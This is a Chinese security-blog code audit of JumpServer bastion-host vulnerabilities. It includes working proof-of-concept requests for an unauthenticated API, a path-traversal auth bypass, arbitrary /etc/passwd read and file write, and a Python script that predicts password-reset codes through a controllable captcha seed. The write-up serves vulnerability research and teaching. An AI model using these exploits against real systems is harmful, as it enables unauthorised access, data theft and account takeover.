#  代码审计 ｜ Jump Server堡垒机历史漏洞审计   
原创 长风安全  长风安全   2024-12-06 16:14  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ahZzVWpAhUJlM5h5931XbF4u10x7Lch5xx3qGMpEicwfILSQVJVfaum5E4E8q7NJd6AsCdcOJNptoUBtG0BdZNA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/xhevcUBTNU0boPTNtE5icewpqH9IniazaUpiaibIcn9OyANTkkmmG4xJp0K4oqmCN5yGUjetuYn9naia8X34yHep2tA/640?wx_fmt=png "")  
  
往期推荐  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PYbjK679A41dfUPibUHoSViaic8HRjhiaD60MwFweBfvWC4jn8vR8fUH6o4L3xftibr4tCicJhoA6M9VHUPnzIzRHrug/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/JEnHr2ticPrU1lg7GaQmR26VXWbRRNjpHd5JVmJ3Ey5Ifah3eQX5CHN3DlT5gOMWO1ysm8ibaEhibBMOlHzkicpnicg/640?wx_fmt=png "")  
  
  
‍  
‍[JS渗透逆向入门 ｜4100字深度解析](https://mp.weixin.qq.com/s?__biz=Mzg4MDkyMTE4OQ==&mid=2247485566&idx=1&sn=78418410710cff1cecb30e57f1731665&scene=21#wechat_redirect)  
  
  
[招聘 ｜渗透岗](https://mp.weixin.qq.com/s?__biz=Mzg4MDkyMTE4OQ==&mid=2247485673&idx=1&sn=edbb6804b54a5bc74ef308e5cfca4544&scene=21#wechat_redirect)  
  
  
**总结**  
  
本文主要介绍Jumpserver代码审计的环境搭建以及历史漏洞审计的过程。详细阐述如何构建JumpServer审计环境及历史漏洞审计，预计阅读时间40分钟。  
  
原文已上传wave实战能力知识库：  
http://cf-sec.cn/wiki  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMc4eW9tgCulVibLDddEt4jibzD4hzIJxaypr18pJMd6Gmh1KZSuWibkK3w/640?wx_fmt=png&from=appmsg "")  
  
01  
  
  
JumpServer  
  
  
E  
  
审计环境搭建  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hdG4aRiaIFFsS2elnjuUdUyXpWzZRf99icg4yTRGTv4zGpoaO3Oicwx39v4bibvQG5IkUiaBDOm0yUDJmo7jibWEWWicw/640?&wx_fmt=png "")  
  
  
centos7/2/4G  
  
提前安装docker和docker-compose  
  
将该文件保存为xxx.sh，然后调用sh xxx.sh运行即可，一路默认安装即可。  
```
#!/usr/bin/env bash
#

VERSION=v3.6.3
DOWNLOAD_URL=https://resource.fit2cloud.com

function install_soft() {
    if command -v dnf > /dev/null; then
      dnf -q -y install "$1"
    elif command -v yum > /dev/null; then
      yum -q -y install "$1"
    elif command -v apt > /dev/null; then
      apt-get -qqy install "$1"
    elif command -v zypper > /dev/null; then
      zypper -q -n install "$1"
    elif command -v apk > /dev/null; then
      apk add -q "$1"
      command -v gettext >/dev/null || {
      apk add -q gettext-dev python3
    }
    else
      echo -e "[\033[31m ERROR \033[0m] $1 command not found, Please install it first"
      exit 1
    fi
}

function prepare_install() {
  for i in curl wget tar iptables; do
    command -v $i &>/dev/null || install_soft $i
  done
}

function get_installer() {
  echo "download install script to /opt/jumpserver-installer-${VERSION}"
  cd /opt || exit 1
  if [ ! -d "/opt/jumpserver-installer-${VERSION}" ]; then
    timeout 60 wget -qO jumpserver-installer-${VERSION}.tar.gz ${DOWNLOAD_URL}/jumpserver/installer/releases/download/${VERSION}/jumpserver-installer-${VERSION}.tar.gz || {
      rm -f /opt/jumpserver-installer-${VERSION}.tar.gz
      echo -e "[\033[31m ERROR \033[0m] Failed to download jumpserver-installer-${VERSION}"
      exit 1
    }
    tar -xf /opt/jumpserver-installer-${VERSION}.tar.gz -C /opt || {
      rm -rf /opt/jumpserver-installer-${VERSION}
      echo -e "[\033[31m ERROR \033[0m] Failed to unzip jumpserver-installer-${VERSION}"
      exit 1
    }
    rm -f /opt/jumpserver-installer-${VERSION}.tar.gz
  fi
}

function config_installer() {
  cd /opt/jumpserver-installer-${VERSION} || exit 1
  sed -i "s/VERSION=.*/VERSION=${VERSION}/g" /opt/jumpserver-installer-${VERSION}/static.env
  ./jmsctl.sh install
  ./jmsctl.sh start
}

function main(){
  if [[ "${OS}" == 'Darwin' ]]; then
    echo
    echo "Unsupported Operating System Error"
    exit 1
  fi
  prepare_install
  get_installer
  config_installer
}

main
```  
  
02  
  
  
漏洞点一  
  
  
  
未授权访问  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hdG4aRiaIFFsS2elnjuUdUyXpWzZRf99icg4yTRGTv4zGpoaO3Oicwx39v4bibvQG5IkUiaBDOm0yUDJmo7jibWEWWicw/640?&wx_fmt=png "")  
  
  
通过Django框架的鉴权可知，可以使用自带的@login_required和@permission_required为每个API接口添加注解；也可以使用REST framework框架基于DRF【django restframework】的鉴权。通常在在setting.py中配置。jumpserver在jumpserver/settings/libs.py设置如下  
```
REST_FRAMEWORK = {
    # Use Django's standard `django.contrib.auth` permissions,
    # or allow read-only access for unauthenticated users.
    'DEFAULT_PERMISSION_CLASSES': (
        'rbac.permissions.RBACPermission',
    ),
    ............
}
```  
  
设置了默认鉴权类rbac.permissions.RBACPermission。【rest_framework在自定义鉴权类时需要引用from rest_framework import permissions或者from rest_framework.permissions import xxxxxxx。并重写has_permission、has_object_permission两个方法】  
  
**has_permission** 和 **has_object_permission** 区别  
  
如需自定义权限，需继承**rest_framework.permissions.BasePermission**父类，并实现以下两个任何一个方法或全部  
- has_permission 是用户对这个视图有没有GET、POST、PUT、PATCH、DELETE权限的分别判断。  
  
- has_object_permission 是用户过了 has_permission 判断有权限以后，再判断这个用户有没有对一个具体的对象有没有操作权限。  
  
## 步骤  
  
通过全局搜索from rest_framework import permissions，定位到terminal.permissions.IsSessionAssignee。该类继承自permissions.BasePermission说明是个鉴权类，但是该类仅重写了has_object_permission。所以我们可以查找哪些视图调用的该类，即可产生未授权访问(如：api/user/)【但是对具体对象操作时(如：api/user/admin)会经过has_object_permission】  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMicTENGia0YnqE0g5DmMg6KFbNS2gOJic45AeoSetkfUSj4H92ib1OQHbGw/640?wx_fmt=png&from=appmsg "")  
  
image-20231007215553991  
  
定位到terminal.api.session.session.SessionViewSet，该接口可以未授权访问，然后再查找对应的URL。  
```
1.查找引用定位到：terminal/urls/api_urls.py 得到配置
router.register(r'sessions', api.SessionViewSet, 'session')
2.接着依靠文件路径转化全局搜索：terminal.urls.api_urls，定位到：jumpserver/urls.py。由配置文件可知该文件为最终的urls路由配置文件，所以结合得到路径：/api/v1/terminal/sessions/
api_v1 = [
    .......
    path('terminal/', include('terminal.urls.api_urls', namespace='api-terminal')),
    .........
]
urlpatterns = [
    ......
    path('api/v1/', include(api_v1)),
    ......
]
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMicib2Nkj2Cm6AGHEzqlAokzZzCty90nqeTdnxTToqtAqrC3PbPGR4jGA/640?wx_fmt=png&from=appmsg "")  
## POC  
  
http://127.0.0.1/api/v1/terminal/sessions/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMXRJ0VLrGicRk6cv2Jx3wMicYSXtkhWr0jTA8rt7uueg4bA8a5vlDqD1g/640?wx_fmt=png&from=appmsg "")  
  
03  
  
  
漏洞点二  
  
  
  
权限绕过  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hdG4aRiaIFFsS2elnjuUdUyXpWzZRf99icg4yTRGTv4zGpoaO3Oicwx39v4bibvQG5IkUiaBDOm0yUDJmo7jibWEWWicw/640?&wx_fmt=png "")  
  
# 权限绕过  
  
Django框架核心是注册App（具体功能的模块）去运行，所有的app都需要到settings.py中注册。包括引用的第三方Django模块组件。如本次存在问题的private_storage(django-private-storage)。这些模块无法享用自定的鉴权类，如果没有额外可配置的鉴权方式可能导致未授权。  
```
INSTALLED_APPS = [
    ......
    'private_storage',
    ......
]
```  
  
通过github搜索django-private-storage，阅读其用法和配置。该模块作用为：提供私人媒体文件存储空间，因此用户上传的文件可以在登录后受到保护。  
  
**Configuration**  
  
Add to the settings:  
```
INSTALLED_APPS += (
    'private_storage',
)

PRIVATE_STORAGE_ROOT = '/path/to/private-media/' #设置媒体路径
PRIVATE_STORAGE_AUTH_FUNCTION = 'private_storage.permissions.allow_staff' #设置鉴权
```  
  
Add to urls.py: （设置API访问路径）  
```
import private_storage.urls

urlpatterns += [
    path('private-media/', include(private_storage.urls)),
]
```  
## 步骤  
  
在后台功能点**审计台—会话审计—会话记录—历史会话—回放功能**位置发现其调用了一个静态资源文件，该资源文件内容存放了对服务器会话操作的历史命令，代码中搜索URL包含的路径media/。找到jumpserver/urls.py中如下配置。然后确定该路由属于第三方django-private-storage。  
```
urlpatterns += [
    # Protect media
    path('media/', include(private_storage.urls)),
]
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMxibfYvv4pKRNiacToNia52EqiappkvXkWDxG8M7Giaq4tDX3LfCHiaklp1UQ/640?wx_fmt=png&from=appmsg "")  
  
image-20231007223554167  
  
遂结合前言中的内容，知晓django-private-storage的基本信息，全局搜索PRIVATE_STORAGE_AUTH_FUNCTION定位到配置处jumpserver/settings/base.py  
```
MEDIA_URL = '/media/'
MEDIA_ROOT = os.path.join(PROJECT_DIR, 'data', 'media').replace('\\', '/') + '/'

PRIVATE_STORAGE_ROOT = MEDIA_ROOT
PRIVATE_STORAGE_AUTH_FUNCTION = 'jumpserver.rewriting.storage.permissions.allow_access'
```  
  
阅读jumpserver.rewriting.storage.permissions.allow_access鉴权代码  
  
根据最初URL进行分析：http://172.16.0.133/media/replay/2023-10-07/f416b261-6c5d-4133-b7e4-b1202d87681c.cast.gz  
- 获取请求的path得到（path="/media/replay/2023-10-07/f416b261-6c5d-4133-b7e4-b1202d87681c.cast.gz"）  
  
- 对path进行处理并获取path_list[1](path_list[1]="replay")再从path_perms_map获取对应的值  
```
path_perms_map = {
    'xpack': '*',
    'settings': '*',
    'replay': 'default',
    'applets': 'terminal.view_applet',
    'playbooks': 'ops.view_playbook'
}
```  
  
  
-   
-   
-   
-   
-   
-   
-   
- 如果path_list[1]为xpack或者settings在第二个if判断处直接返回true，其余情况均需要鉴权。  
  
利用思路：该处未对../等符号进行过滤导致可以路径穿越影响判断，造成鉴权绕过。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuM3mstG4gwardJewQg6BIv9AQBjy9GHZXvFJculcgDEFHofqZibDE0x9w/640?wx_fmt=png&from=appmsg "")  
## POC  
  
后面的UUID可以配置未授权漏洞获取，两个漏洞配合使用  
  
http://172.16.0.133/media/xpack/../replay/2023-10-07/f416b261-6c5d-4133-b7e4-b1202d87681c.cast.gz  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMNXeiaWtYicZwiaOhbqLMIFStmHr1hibZLRv47zCNiaO2bT4rpkPtKIyXJmg/640?wx_fmt=png&from=appmsg "")  
  
04  
  
  
漏洞点三  
  
  
  
伪随机数用户接管  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hdG4aRiaIFFsS2elnjuUdUyXpWzZRf99icg4yTRGTv4zGpoaO3Oicwx39v4bibvQG5IkUiaBDOm0yUDJmo7jibWEWWicw/640?&wx_fmt=png "")  
  
# 伪随机数用户接管  
  
当random.seed(key)中key可控将导致random生成的随机数可预测。如下测试案例中每次生成的结果均一样。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMPCqM1s2jAy8sdOzzdHfDehN2KicKp0hPKTGaQCl3F1lnCBDZ1FMKTTA/640?wx_fmt=png&from=appmsg "")  
  
利用场景：在可控的前提下如果后端的token、短信验证码、邮箱验证码等值由random生成将可预测从而导致用户接管  
## 步骤  
  
全局搜索(包含第三方库)random.seed，定位到代码captcha.views.captcha_image处于第三方库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuM4JQ8gglvbiczSpVUP6iaZVSA41UwffWeJHqeqo8yOPrIWNa7dmicF68Fw/640?wx_fmt=png&from=appmsg "")  
  
通过查找引用来到apps\venv\Lib\site-packages\captcha\urls.py，key来自用户传参，且该第三方库在setting中已注册。这意味着可以用户可以通过random.seed函数随时重置随机数种子造成伪随机数可预测的情况  
```
INSTALLED_APPS = [
    ......
    'captcha',
    ......
]
#----------------------------------
urlpatterns = [
    ......
    path('core/auth/captcha/', include('captcha.urls')),
    ......
]
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMfXTggqjnJUqjHVJ1iawfhTwbaq8hp8NasaXOFaQtJicTI9Ps5sQYGMTA/640?wx_fmt=png&from=appmsg "")  
  
接下来寻找哪些地方调用生成随机数，比较明显可能存在的位置**token、短信验证码、邮箱验证码等**。这儿我们直接找前台忘记密码处存在使用random生成邮箱验证码从而重置密码  
  
重置密码流程：  
1. 点击重置密码来到忘记密码(http://172.16.0.133/core/auth/password/forget/previewing/)页面，输入存在的用户名和图形验证码(http://172.16.0.133/core/auth/captcha/image/9d7818c96dacc1276c15fd04313db681237a5dda/)  
  
1. 跳转到(http://172.16.0.133/core/auth/password/forgot/?token=sPwF68xCg0teq849TR1M1EEaRyw0MxH9hFsc)，获取到token。输入上一步中用户对应的邮箱，点击发送，数据包将携带token、邮箱发送到后端(http://172.16.0.133/api/v1/authentication/password/reset-code/?token=sPwF68xCg0teq849TR1M1EEaRyw0MxH9hFsc    {"form_type":"email","email":"admin@mycomany.com","sms":""})生成邮箱验证码  
  
通过搜索reset-code/定位到authentication.api.password.UserResetPasswordSendCodeApi.create方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMUJ1UdjZwFeYVoaTXkbLBib6icIOsQcq6crdVaZmicPwoK3XmJ3CnfJvHg/640?wx_fmt=png&from=appmsg "")  
1. 获取token字段，从缓存中获取token对应的内容，在/core/auth/password/forget/previewing/对应的users.views.profile.reset.UserForgotPasswordPreviewingView.form_valid方法可知，token与用户信息相绑定，并且在54行，设置了token过期时间为5分钟![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMP7Ak8F6JCE7ovcHNnXI8ibtzRaQpap14kHKEpSYkRjCrMNe2dk44OqA/640?wx_fmt=png&from=appmsg "")  
  
  
1. 校验用户信息是否正确，并在第51行通过random_string(6, lower=False, upper=False)生成6位数的验证码，跟踪验证码生成逻辑，调用了random.choice。配合random.seed可控导致此处可预测。  
```
def random_string(length: int, lower=True, upper=True, digit=True, special_char=False):
    args_names = ['lower', 'upper', 'digit', 'special_char']
    args_values = [lower, upper, digit, special_char]
    args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation]
    args_string_map = dict(zip(args_names, args_string))
    kwargs = dict(zip(args_names, args_values))
    kwargs_keys = list(kwargs.keys())
    kwargs_values = list(kwargs.values())
    args_true_count = len([i for i in kwargs_values if i])
    assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`'
    assert length >= args_true_count, f'Expected length >= {args_true_count}, bug got {length}'

    can_startswith_special_char = args_true_count == 1 and special_char

    chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v])

    while True:
        password = list(random.choice(chars) for i in range(length))
        for k, v in kwargs.items():
            if v and not (set(password) & set(args_string_map[k])):
                # 没有包含指定的字符, retry
                break
        else:
            if not can_startswith_special_char and password[0] in args_string_map['special_char']:
                # 首位不能为特殊字符, retry
                continue
            else:
                # 满足要求终止 while 循环
                break

    password = ''.join(password)
    return password
```  
  
  
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
## POC  
  
在上述分析中可知，图形验证码(http://172.16.0.133/core/auth/captcha/image/9d7818c96dacc1276c15fd04313db681237a5dda/)处可设置随机数种子，我们还需要知道随机数深度才能预测验证码。  
  
利用流程：  
1. 先输入用户名和图形验证码获取token  
  
1. 输入好邮箱，在此时发送请求重置随机数种子  
  
1. 点击发送邮箱验证码  
  
随机数深度我们需要看一下第二步和第三步调用了多少次random。  
  
**第二步**  
  
captcha_image函数共有两个处random，在第二个位置验证码字符个数位置调用了random  
```
def captcha_image(request, key, scale=1):
    ......
    try:
        store = CaptchaStore.objects.get(hashkey=key)
    ......
    random.seed(key)
    text = store.challenge
	......
    #venv\Lib\site-packages\captcha\conf\settings.py中CAPTCHA_FONT_PATH是个字符串，直接走第一个if
    if isinstance(settings.CAPTCHA_FONT_PATH, str):
        fontpath = settings.CAPTCHA_FONT_PATH
    elif isinstance(settings.CAPTCHA_FONT_PATH, (list, tuple)):
        fontpath = random.choice(settings.CAPTCHA_FONT_PATH)
    else:
        raise ImproperlyConfigured(
            "settings.CAPTCHA_FONT_PATH needs to be a path to a font or list of paths to fonts"
        )
	......
    charlist = []
    for char in text:
        if char in settings.CAPTCHA_PUNCTUATION and len(charlist) >= 1:
            charlist[-1] += char
        else:
            charlist.append(char)
    for char in charlist:
        fgimage = Image.new("RGB", size, settings.CAPTCHA_FOREGROUND_COLOR)
        charimage = Image.new("L", getsize(font, " %s " % char), "#000000")
        chardraw = ImageDraw.Draw(charimage)
        chardraw.text((0, 0), " %s " % char, font=font, fill="#ffffff")
        #CAPTCHA_LETTER_ROTATION默认存在，根据验证码生成请求和查阅资料，charlist这里是指验证码字符个数4
        if settings.CAPTCHA_LETTER_ROTATION:
            charimage = charimage.rotate(
                random.randrange(*settings.CAPTCHA_LETTER_ROTATION),
                expand=0,
                resample=Image.BICUBIC,
            )
    for f in settings.noise_functions():
    	draw = f(draw, image)
    ......
```  
  
但是通过阅读django-simple-captcha配置项在项目中找到，并根据settings.noise_functions()找到captcha.helpers.noise_dots函数，根据CAPTCHA_IMAGE_SIZE我们知道了调用深度  
```
# Captcha settings, more see https://django-simple-captcha.readthedocs.io/en/latest/advanced.html
CAPTCHA_IMAGE_SIZE = (180, 38)
CAPTCHA_FOREGROUND_COLOR = '#001100'
CAPTCHA_NOISE_FUNCTIONS = ('captcha.helpers.noise_dots',)
CAPTCHA_CHALLENGE_FUNCT = 'captcha.helpers.math_challenge'
```  
```
def noise_dots(draw, image):
    size = image.size
    for p in range(int(size[0] * size[1] * 0.1)):
        draw.point(
            (random.randint(0, size[0]), random.randint(0, size[1])),
            fill=settings.CAPTCHA_FOREGROUND_COLOR,
        )
    return draw
```  
  
**第三步**  
  
这一步中就只有在生成邮箱验证码时调用了random也就是上文提到的random_string函数。  
  
综上随机数深度我们已经计算出来了。构造POC  
```
import random
import string
string_punctuation = '!#$%&()*+,-.:;<=>?@[]^_~'
key="9d7818c96dacc1276c15fd04313db681237a5dda"
random.seed(key)
def noise_dots():
    for i in range(4):
        random.randrange(-35, 35)
    for p in range(int(180 * 38 * 0.1)):
    #for p in range(int(size[0] * size[1] * 0.1)):
        random.randint(0, 180)
        random.randint(0, 38)
def random_string(length: int, lower=True, upper=True, digit=True, special_char=False):
    args_names = ['lower', 'upper', 'digit', 'special_char']
    args_values = [lower, upper, digit, special_char]
    args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation]
    args_string_map = dict(zip(args_names, args_string))
    kwargs = dict(zip(args_names, args_values))
    kwargs_keys = list(kwargs.keys())
    kwargs_values = list(kwargs.values())
    args_true_count = len([i for i in kwargs_values if i])
    assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`'
    assert length >= args_true_count, f'Expected length >= {args_true_count}, bug got {length}'

    can_startswith_special_char = args_true_count == 1 and special_char

    chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v])

    while True:
        password = list(random.choice(chars) for i in range(length))
        for k, v in kwargs.items():
            if v and not (set(password) & set(args_string_map[k])):
                # 没有包含指定的字符, retry
                break
        else:
            if not can_startswith_special_char and password[0] in args_string_map['special_char']:
                # 首位不能为特殊字符, retry
                continue
            else:
                # 满足要求终止 while 循环
                break

    password = ''.join(password)
    return password
noise_dots()
code=random_string(6, lower=False, upper=False)
print(code)
```  
#   
  
05  
  
  
漏洞点四  
  
  
  
任意文件上传/下载  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hdG4aRiaIFFsS2elnjuUdUyXpWzZRf99icg4yTRGTv4zGpoaO3Oicwx39v4bibvQG5IkUiaBDOm0yUDJmo7jibWEWWicw/640?&wx_fmt=png "")  
  
## 步骤  
  
全局搜索.read()/.readline/with open(/.write(，定位到ops.api.playbook.PlaybookFileBrowserAPIView  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FODKWahS5qIrpUlQhDb4bQIc3dnib2nuMft86lWD8vuEFW44XvR08icu1PDtKDjauYvM5sVZ35V81FHLyCib4AWTA/640?wx_fmt=png&from=appmsg "")  
  
如下是详细代码，重写了get、post、patch、delete请求依次对应。在get方法中通过传参key配合默认路径进行拼接获取对应文件内容，但是未对../等字符进行过滤造成目录穿越任意文件读取  
  
在post方法中同样是通过name传参文件名，通过content传入内容，未限制文件后缀和文件内容。造成目录穿越任意文件写入  
```
class PlaybookFileBrowserAPIView(APIView):
    rbac_perms = ()
    permission_classes = (RBACPermission,)
    rbac_perms = {
        'GET': 'ops.change_playbook',
        'POST': 'ops.change_playbook',
        'DELETE': 'ops.change_playbook',
        'PATCH': 'ops.change_playbook',
    }
    protected_files = ['root', 'main.yml']
    def get(self, request, **kwargs):
        playbook_id = kwargs.get('pk')
        playbook = get_object_or_404(Playbook, id=playbook_id)
        work_path = playbook.work_dir
        file_key = request.query_params.get('key', '')
        if file_key:
            file_path = os.path.join(work_path, file_key)
            with open(file_path, 'r') as f:
                try:
                    content = f.read()
                except UnicodeDecodeError:
                    content = _('Unsupported file content')
                return Response({'content': content})
        else:
            expand_key = request.query_params.get('expand', '')
            nodes = self.generate_tree(playbook, work_path, expand_key)
            return Response(nodes)
    def post(self, request, **kwargs):
        playbook_id = kwargs.get('pk')
        playbook = get_object_or_404(Playbook, id=playbook_id)
        work_path = playbook.work_dir
        parent_key = request.data.get('key', '')
        if parent_key == 'root':
            parent_key = ''
        if os.path.dirname(parent_key) == 'root':
            parent_key = os.path.basename(parent_key)
        full_path = os.path.join(work_path, parent_key)
        is_directory = request.data.get('is_directory', False)
        content = request.data.get('content', '')
        name = request.data.get('name', '')
        def find_new_name(p, is_file=False):
            if not p:
                if is_file:
                    p = 'new_file.yml'
                else:
                    p = 'new_dir'
            np = os.path.join(full_path, p)
            n = 0
            while os.path.exists(np):
                n += 1
                np = os.path.join(full_path, '{}({})'.format(p, n))
            return np
        if is_directory:
            new_file_path = find_new_name(name)
            os.makedirs(new_file_path)
        else:
            new_file_path = find_new_name(name, True)
            with open(new_file_path, 'w') as f:
                f.write(content)
        relative_path = os.path.relpath(os.path.dirname(new_file_path), work_path)
        new_node = {
            "name": os.path.basename(new_file_path),
            "title": os.path.basename(new_file_path),
            "id": os.path.join(relative_path, os.path.basename(new_file_path))
            if not os.path.join(relative_path, os.path.basename(new_file_path)).startswith('.')
            else os.path.basename(new_file_path),
            "isParent": is_directory,
            "pId": relative_path if not relative_path.startswith('.') else 'root',
            "open": True,
        }
        if not is_directory:
            new_node['iconSkin'] = 'file'
        return Response(new_node)
    def patch(self, request, **kwargs):
        playbook_id = kwargs.get('pk')
        playbook = get_object_or_404(Playbook, id=playbook_id)
        work_path = playbook.work_dir
        file_key = request.data.get('key', '')
        new_name = request.data.get('new_name', '')
        if file_key in self.protected_files and new_name:
            return Response({'msg': '{} can not be rename'.format(file_key)}, status=status.HTTP_400_BAD_REQUEST)
        if os.path.dirname(file_key) == 'root':
            file_key = os.path.basename(file_key)
        content = request.data.get('content', '')
        is_directory = request.data.get('is_directory', False)
        if not file_key or file_key == 'root':
            return Response(status=status.HTTP_400_BAD_REQUEST)
        file_path = os.path.join(work_path, file_key)
        # rename
        if new_name:
            new_file_path = os.path.join(os.path.dirname(file_path), new_name)
            if new_file_path == file_path:
                return Response(status=status.HTTP_200_OK)
            if os.path.exists(new_file_path):
                return Response({'msg': '{} already exists'.format(new_name)}, status=status.HTTP_400_BAD_REQUEST)
            os.rename(file_path, new_file_path)
        # edit content
        else:
            if not is_directory:
                with open(file_path, 'w') as f:
                    f.write(content)
        return Response(status=status.HTTP_200_OK)
    def delete(self, request, **kwargs):
        playbook_id = kwargs.get('pk')
        playbook = get_object_or_404(Playbook, id=playbook_id)
        work_path = playbook.work_dir
        file_key = request.query_params.get('key', '')
        if not file_key:
            return Response({'msg': 'key is required'}, status=status.HTTP_400_BAD_REQUEST)
        if file_key in self.protected_files:
            return Response({'msg': ' {} can not be delete'.format(file_key)}, status=status.HTTP_400_BAD_REQUEST)
        file_path = os.path.join(work_path, file_key)
        if os.path.isdir(file_path):
            shutil.rmtree(file_path)
        else:
            os.remove(file_path)
        return Response({'msg': 'ok'})
    @staticmethod
    def generate_tree(playbook, root_path, expand_key=None):
        nodes = [{
            "name": playbook.name,
            "title": playbook.name,
            "id": 'root',
            "isParent": True,
            "open": True,
            "pId": '',
            "temp": False
        }]
        for path, dirs, files in os.walk(root_path):
            dirs.sort()
            files.sort()
            relative_path = os.path.relpath(path, root_path)
            for d in dirs:
                node = {
                    "name": d,
                    "title": d,
                    "id": os.path.join(relative_path, d) if not os.path.join(relative_path, d).startswith(
                        '.') else d,
                    "isParent": True,
                    "open": True,
                    "pId": relative_path if not relative_path.startswith('.') else 'root',
                    "temp": False
                }
                if expand_key == node['id']:
                    node['open'] = True
                nodes.append(node)
            for f in files:
                node = {
                    "name": f,
                    "title": f,
                    "iconSkin": 'file',
                    "id": os.path.join(relative_path, f) if not os.path.join(relative_path, f).startswith(
                        '.') else f,
                    "isParent": False,
                    "open": False,
                    "pId": relative_path if not relative_path.startswith('.') else 'root',
                    "temp": False
                }
                nodes.append(node)
        return nodes

```  
## POC  
  
首先需要到后台**工作台—作业中心—模板管理—创建paybook**，然后根据生成的作业uuid执行以下POC  
  
**任意文件下载**  
  
http://172.16.0.133/api/v1/ops/playbook/<uuid:pk>/file/?key=../../../../../../../etc/passwd  
  
**任意文件上传**  
```
POST http://172.16.0.133/api/v1/ops/playbook/<uuid:pk>/file/

name=../../../../../../../test.txt&content=success&key=&is_directory=
```  
  
  
生活笔记  
        
  
2024年是过的最快的一年。站在时间的交汇点，有的人踌躇满志，有的人逡巡不前。  
  
这一年，对每个人来说，都说一段不可复制的旅程。  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/FODKWahS5qJoibL8gvEgeDrbTWIic7QVlv51C1dg73L0P6tX3M9cbhYOq8PK0icq780CvHkkibj2Slpbia5pgkdawow/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/FODKWahS5qJoibL8gvEgeDrbTWIic7QVlv51C1dg73L0P6tX3M9cbhYOq8PK0icq780CvHkkibj2Slpbia5pgkdawow/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**点赞鼓励一下**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/kw2nrMk65sdm2h1H7HL0PuJZltDnjKlKJKwx2SOicHZ6ciceNaAhompextcznbssviakCvDN8S2yJxhDVDuZhxSFw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/VB9lZ9dN4bkDNJnc9icsykSuljwJFM0rhmUgmpMHFhqk0G7x9fLgibbVttEo1XaWq2pyOlFx57g4fb9s0UWywlbQ/640?&wx_fmt=png "")  
  
点个   
「在看」 你最好看  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IGB4cLafvu5hIW27PLqjTA93j5tMViajxyG2ZkKFQBjWqcE7yVibP18iaTWPh574Eos6nkE9aiaGj8guWNwibmlLVQg/640?&wx_fmt=png "")  
  
  
